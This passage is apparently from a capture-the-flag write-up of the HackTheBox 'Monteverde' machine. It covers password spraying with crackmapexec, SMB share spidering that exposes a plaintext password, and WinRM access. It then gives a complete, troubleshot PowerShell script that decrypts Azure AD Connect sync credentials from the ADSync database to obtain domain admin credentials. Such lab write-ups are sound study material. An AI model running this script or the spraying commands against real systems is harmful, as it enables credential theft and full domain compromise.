<p>where the <code class="language-plaintext highlighter-rouge">-e</code> flag with the <code class="language-plaintext highlighter-rouge">s</code> argument is the part instructing <code class="language-plaintext highlighter-rouge">hydra</code> to use the same entry for both username and password.</p>

<p><img src="/assets/Monteverde/hydra-attack.jpg" alt="hydra-attack" /></p>

<h2 id="smb-access">SMB Access</h2>
<p>After we verify that <code class="language-plaintext highlighter-rouge">SABatchJobs</code> doesn’t have <strong>WinRM</strong> access, we enumerate <strong>SMB</strong> as him using <code class="language-plaintext highlighter-rouge">crackmapexec</code>’s <code class="language-plaintext highlighter-rouge">spider_plus</code> module.</p>

<p>This module does as the name suggests: it <em>recursively</em> spiders <strong>SMB</strong> shares and outputs the results in a temp folder.</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.172 <span class="nt">-u</span> SABatchJobs <span class="nt">-p</span> SABatchJobs <span class="nt">-M</span> spider_plus
</code></pre></div></div>

<p><img src="/assets/Monteverde/cme-spiderplus.jpg" alt="cme-spiderplus" /></p>

<p><em>Looking at the results in the output</em> <strong>JSON</strong> <em>file,</em> we notice a very interesting file: <code class="language-plaintext highlighter-rouge">azure.xml</code> which existed in the <code class="language-plaintext highlighter-rouge">users</code> share under the folder for the <code class="language-plaintext highlighter-rouge">mhope</code> user:</p>

<p><img src="/assets/Monteverde/azure-xml-file.jpg" alt="azure-xml-file" /></p>

<p>We connect to the share with <code class="language-plaintext highlighter-rouge">smbclient</code> and download the file to view its contents:</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //10.10.10.172/users<span class="nv">$ </span><span class="nt">-U</span> SABatchJobs
</code></pre></div></div>

<p>and we get a password!</p>

<p><img src="/assets/Monteverde/mhope-password.jpg" alt="mhope-password" /></p>

<h2 id="shell-access-as-mhope">Shell Access as <code class="language-plaintext highlighter-rouge">mhope</code></h2>
<p><em>After getting this password,</em> we immediately spray it over the domain users. We find that it’s valid and that we have <strong>WinRM</strong> access as well!</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec winrm 10.10.10.172 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'4n0therD4y@n0th3r$'</span> <span class="nt">--continue-on-success</span>
</code></pre></div></div>

<p><strong>Note:</strong> we used the <code class="language-plaintext highlighter-rouge">--continue-on-success</code> to be able to take advantage of any password reuse.</p>

<p><img src="/assets/Monteverde/winrm-as-mhope.jpg" alt="winrm-as-mhope" /></p>

<p>We login using <code class="language-plaintext highlighter-rouge">evil-winrm</code> to get a <strong>PowerShell</strong> session on the box:</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.10.172 <span class="nt">-u</span> mhope <span class="nt">-p</span> <span class="s1">'4n0therD4y@n0th3r$'</span>
</code></pre></div></div>

<p><img src="/assets/Monteverde/evil-winrm-access.jpg" alt="evil-winrm-access" /></p>

<h2 id="enumeration-before-privesc">Enumeration before Privesc</h2>
<p>Running a quick <code class="language-plaintext highlighter-rouge">whoami /groups</code> command shows that we are in an AD group called <code class="language-plaintext highlighter-rouge">Azure Admins</code></p>

<p><img src="/assets/Monteverde/ad-group-membership.jpg" alt="ad-group-membership" /></p>

<p>We also notice a strange folder on <code class="language-plaintext highlighter-rouge">mhope</code>’s user profile.</p>

<p><img src="/assets/Monteverde/dot-azure-folder.jpg" alt="dot-azure-folder" /></p>

<p>And in the <code class="language-plaintext highlighter-rouge">c:\Program Files</code> directory, we find a whole bunch of software relevant to <strong>Azure AD Sync</strong></p>

<p><img src="/assets/Monteverde/program-files.jpg" alt="program-files" /></p>

<p><em>Right now,</em> our senses are <em>tingling</em>. <em>Because,</em> we had a lot of signs along the way that are pointing towards this area:</p>
<ol>
  <li>the <code class="language-plaintext highlighter-rouge">AAD_987d7f2f57d2</code> user</li>
  <li>the <code class="language-plaintext highlighter-rouge">azure.xml</code> file</li>
  <li>the <code class="language-plaintext highlighter-rouge">Azure Admins</code> group membership</li>
  <li>the <code class="language-plaintext highlighter-rouge">.Azure</code> folder</li>
  <li>the Azure related software in <code class="language-plaintext highlighter-rouge">Program Files</code></li>
</ol>

<p>So we go ahead and do some googling :D</p>

<h2 id="research">Research</h2>
<p>We decide to use a broad term in our first search to make things easier for ourselves. We type in: “Azure AD Sync Privilege Escalation”</p>

<p>and we get this awesome blog post <a href="/assets/Monteverde/https://blog.xpnsec.com/azuread-connect-for-redteam/">here</a>:</p>

<p><img src="/assets/Monteverde/privesc-blog.jpg" alt="privesc-blog" /></p>

<p><em>Reading the post,</em> we learn that <strong>Azure AD Connect</strong> is: a tool for <em>integrating between</em> both <strong>On-Prem Active Directory Deployments</strong> and <strong>Azure AD</strong>.</p>

<p>It has the <strong>Password Hash Syncronization (PHS)</strong> feature which “<em>uploads user accounts and password hashes from Active Directory to Azure</em>”.</p>

<p>We also learn that: <em>during the setup,</em> an <strong>AD account</strong> is used to perform the sync process. And is granted the <strong>necessary permissions</strong> to be able to access all the <strong>domain hashes</strong>.</p>

<p>One more thing we notice: is that the credentials for the synchronization account are <strong>found on the local database</strong> included in the installation process.</p>

<p><em>And, even though they are encrypted,</em> the key to <strong>decrypt</strong> them is also present on the same database.</p>

<h2 id="trying-the-powershell-script">Trying the PowerShell Script</h2>
<p>The researcher and blog author <strong>“Adam Chester”</strong> had thankfully created a script that takes care of all the above and dumps us the stored credentials <em>if we had access to the database.</em></p>

<p>We’re going to use a brief command to try connecting to the local database to see if we can query it: <code class="language-plaintext highlighter-rouge">sqlcmd -Q "SELECT name FROM master.dbo.sysdatabases"</code></p>

<p>Seems like we do!</p>

<p><img src="/assets/Monteverde/database-access.jpg" alt="database-access" /></p>

<p><em>After using the script,</em> we notice that it runs. But it stops right after it prints its banner and we lose our shell.</p>

<p><img src="/assets/Monteverde/script-fail.jpg" alt="script-fail" /></p>

<h2 id="troubleshooting">Troubleshooting</h2>
<p><em>Since the script isn’t big (&lt; 40 lines)</em>, It wouldn’t be difficult to step through it line-by-line to find out what’s wrong.</p>

<p>we take a look at the first 5 lines:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"AD Connect Sync Credential Extract POC (@_xpn_)</span><span class="se">`n</span><span class="s2">"</span><span class="w">

</span><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new-object</span><span class="w"> </span><span class="nx">System.Data.SqlClient.SqlConnection</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s2">"Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"</span><span class="w">
</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Open</span><span class="p">()</span><span class="w">
</span><span class="nv">$cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">CreateCommand</span><span class="p">()</span><span class="w">

</span></code></pre></div></div>

<p>And start by running the part which defines how the script will connect to the database a.k.a the <strong>“connection string”</strong>.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new-object</span><span class="w"> </span><span class="nx">System.Data.SqlClient.SqlConnection</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s2">"Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"</span><span class="w">
</span></code></pre></div></div>

<p>which runs okay. Because we’re not really taking any action here. Just initializing an object of the type “System.Data.SqlClient.SqlConnection”. Nothing more.</p>

<p>We get the error on the <code class="language-plaintext highlighter-rouge">$client.Open()</code> part though:</p>

<p><img src="/assets/Monteverde/sql-error.jpg" alt="sql-error" /></p>

<p>Reading the sentences in the error tells us something about <strong>network-related</strong> errors and trying to reach the <strong>SQL server</strong> <em>remotely</em>.</p>

<p>we confirm this by consulting the <strong>Microsoft Documentation</strong> on connection strings <a href="/assets/Monteverde/https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlconnection.connectionstring?view=dotnet-plat-ext-6.0#system-data-sqlclient-sqlconnection-connectionstring">here</a>.</p>

<p>it says the <strong>“Data Source”</strong> is for the <strong>“The name or network address of the instance of SQL Server to which to connect.”</strong>.</p>

<p><img src="/assets/Monteverde/Data-Source-Doc.jpg" alt="Data-Source-Doc" /></p>

<p>so we change it up and just use <code class="language-plaintext highlighter-rouge">localhost</code> instead. But, we get a different error this time:</p>

<p><img src="/assets/Monteverde/sql-login-error.jpg" alt="sql-login-error" /></p>

<p>Seems that the connection string doesn’t use our <code class="language-plaintext highlighter-rouge">mhope</code> user credentials.</p>

<p><em>Looking again at the</em> <strong>Microsoft Documentation,</strong> we find info related to authentication:</p>

<p><img src="/assets/Monteverde/sql-auth.jpg" alt="sql-auth" /></p>

<p><em>After modyfing the connection string,</em> we get no errors when opening the connection. Seems promising! :)</p>

<p><img src="/assets/Monteverde/correct-conn-string.jpg" alt="correct-conn-string" /></p>

<h2 id="enough-troubleshooting-let-me-see-some-creds">Enough Troubleshooting. Let me see some creds!</h2>
<p><em>After modifying the connection string,</em> let’s go over what the script does in brief:</p>

<ol>
  <li>Defining the connection string: we’re connecting to the <strong>ADSync DB</strong> on the <strong>local computer</strong> using <strong>Windows Authentication</strong></li>
</ol>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$connection_string</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Data Source=localhost;Initial Catalog=ADSync;Integrated Security=true;"</span><span class="w">
</span><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new-object</span><span class="w"> </span><span class="nx">System.Data.SqlClient.SqlConnection</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="nv">$connection_string</span><span class="w">
</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Open</span><span class="p">()</span><span class="w">
</span><span class="nv">$cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">CreateCommand</span><span class="p">()</span><span class="w">
</span></code></pre></div></div>

<ol>
  <li>Querying for the important bits to do the decryption: <code class="language-plaintext highlighter-rouge">keyset_id</code>, <code class="language-plaintext highlighter-rouge">instance_id</code> and <code class="language-plaintext highlighter-rouge">entropy</code> from the <code class="language-plaintext highlighter-rouge">mms_server_configuration</code> table</li>
</ol>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cmd</span><span class="o">.</span><span class="nf">CommandText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"</span><span class="w">
</span><span class="nv">$reader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$cmd</span><span class="o">.</span><span class="nf">ExecuteReader</span><span class="p">()</span><span class="w">
</span><span class="nv">$reader</span><span class="o">.</span><span class="nf">Read</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nv">$key_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reader</span><span class="o">.</span><span class="nf">GetInt32</span><span class="p">(</span><span class="nx">0</span><span class="p">)</span><span class="w">
</span><span class="nv">$instance_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reader</span><span class="o">.</span><span class="nf">GetGuid</span><span class="p">(</span><span class="nx">1</span><span class="p">)</span><span class="w">
</span><span class="nv">$entropy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reader</span><span class="o">.</span><span class="nf">GetGuid</span><span class="p">(</span><span class="nx">2</span><span class="p">)</span><span class="w">
</span><span class="nv">$reader</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w">
</span></code></pre></div></div>

<ol>
  <li>Obtaining the configuration items: <code class="language-plaintext highlighter-rouge">private_configuration_xml</code> and <code class="language-plaintext highlighter-rouge">encrypted_configuration</code> from the <code class="language-plaintext highlighter-rouge">mms_management_agent</code> table</li>
</ol>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">CreateCommand</span><span class="p">()</span><span class="w">
</span><span class="nv">$cmd</span><span class="o">.</span><span class="nf">CommandText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"</span><span class="w">
</span><span class="nv">$reader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$cmd</span><span class="o">.</span><span class="nf">ExecuteReader</span><span class="p">()</span><span class="w">
</span><span class="nv">$reader</span><span class="o">.</span><span class="nf">Read</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nv">$config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reader</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nx">0</span><span class="p">)</span><span class="w">
</span><span class="nv">$crypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reader</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nx">1</span><span class="p">)</span><span class="w">
</span><span class="nv">$reader</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w">
</span></code></pre></div></div>

<ol>
  <li>Loading the <code class="language-plaintext highlighter-rouge">mcrypt.dll</code> into memory and carrying out the decryption using the keys extracted from <strong>Step #1</strong></li>
</ol>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add-type</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="s1">'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'</span><span class="w">
</span><span class="nv">$km</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager</span><span class="w">
</span><span class="nv">$km</span><span class="o">.</span><span class="nf">LoadKeySet</span><span class="p">(</span><span class="nv">$entropy</span><span class="p">,</span><span class="w"> </span><span class="nv">$instance_id</span><span class="p">,</span><span class="w"> </span><span class="nv">$key_id</span><span class="p">)</span><span class="w">
</span><span class="nv">$key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$null</span><span class="w">
</span><span class="nv">$km</span><span class="o">.</span><span class="nf">GetActiveCredentialKey</span><span class="p">([</span><span class="n">ref</span><span class="p">]</span><span class="nv">$key</span><span class="p">)</span><span class="w">
</span><span class="nv">$key2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$null</span><span class="w">
</span><span class="nv">$km</span><span class="o">.</span><span class="nf">GetKey</span><span class="p">(</span><span class="nx">1</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$key2</span><span class="p">)</span><span class="w">
</span><span class="nv">$decrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$null</span><span class="w">
</span><span class="nv">$key2</span><span class="o">.</span><span class="nf">DecryptBase64ToString</span><span class="p">(</span><span class="nv">$crypted</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$decrypted</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<ol>
  <li>Selecting the domain, username and password from the XML-formatted output and printing them to the screen.</li>
</ol>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$domain</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="n">select-xml</span><span class="w"> </span><span class="nt">-Content</span><span class="w"> </span><span class="nv">$config</span><span class="w">    </span><span class="nt">-XPath</span><span class="w"> </span><span class="s2">"//parameter[@name='forest-login-domain']"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="p">@{</span><span class="nx">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Domain'</span><span class="p">;</span><span class="w"> </span><span class="nx">Expression</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">node</span><span class="o">.</span><span class="nf">InnerXML</span><span class="p">}}</span><span class="w">
</span><span class="nv">$username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">select-xml</span><span class="w"> </span><span class="nt">-Content</span><span class="w"> </span><span class="nv">$config</span><span class="w">    </span><span class="nt">-XPath</span><span class="w"> </span><span class="s2">"//parameter[@name='forest-login-user']"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="p">@{</span><span class="nx">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Username'</span><span class="p">;</span><span class="w"> </span><span class="nx">Expression</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">node</span><span class="o">.</span><span class="nf">InnerXML</span><span class="p">}}</span><span class="w">
</span><span class="nv">$password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">select-xml</span><span class="w"> </span><span class="nt">-Content</span><span class="w"> </span><span class="nv">$decrypted</span><span class="w"> </span><span class="nt">-XPath</span><span class="w"> </span><span class="s2">"//attribute"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="p">@{</span><span class="nx">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Password'</span><span class="p">;</span><span class="w"> </span><span class="nx">Expression</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">node</span><span class="o">.</span><span class="nf">InnerText</span><span class="p">}}</span><span class="w">

</span><span class="n">Write-Host</span><span class="w"> </span><span class="p">(</span><span class="s2">"Domain: "</span><span class="w">   </span><span class="o">+</span><span class="w"> </span><span class="nv">$domain</span><span class="o">.</span><span class="nf">Domain</span><span class="p">)</span><span class="w">
</span><span class="n">Write-Host</span><span class="w"> </span><span class="p">(</span><span class="s2">"Username: "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$username</span><span class="o">.</span><span class="nf">Username</span><span class="p">)</span><span class="w">
</span><span class="n">Write-Host</span><span class="w"> </span><span class="p">(</span><span class="s2">"Password: "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$password</span><span class="o">.</span><span class="nf">Password</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<p><em>With everything in place,</em> we run the script and get a clean set of creds ;]</p>

<p><img src="/assets/Monteverde/domain-admin-creds.jpg" alt="domain-admin-creds" /></p>

<p>The creds are good and the box is <strong>owned</strong> :D</p>

<p><img src="/assets/Monteverde/rooted.jpg" alt="rooted" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>